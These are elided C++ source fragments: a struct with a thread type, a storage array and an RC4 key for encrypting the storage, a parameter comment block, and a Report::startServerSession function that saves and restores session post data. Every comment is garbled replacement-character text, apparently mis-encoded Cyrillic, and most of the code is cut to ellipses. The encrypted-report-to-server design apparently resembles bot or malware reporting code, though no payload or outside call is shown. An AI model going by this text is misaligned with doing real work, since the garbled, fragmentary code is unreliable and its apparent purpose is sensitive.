...
{
  BYTE threadType;                   //���� �� �������� TT_*.
  BinStorage::STORAGEARRAY storage;  //������. 
  Crypt::RC4KEY rc4StorageKey;       //���� ��� ������������ � ���������.
...
/*
  ...
  OUT fileName - ������ ���� �����.
  IN tempFile  - ������ ���� ���������� �����.
  IN maxDelay  - ���� ����� �������� ��� ������ max(errorDelay, normalDelay).
...
bool Report::startServerSession(SERVERSESSION *session)
{
  ...
  BinStorage::STORAGE *originalPostData = session->postData; //��������� ������������ ����-������.
  ...
  session->postData = originalPostData; //��������������� ������������ ����-������.
  return retVal;
}
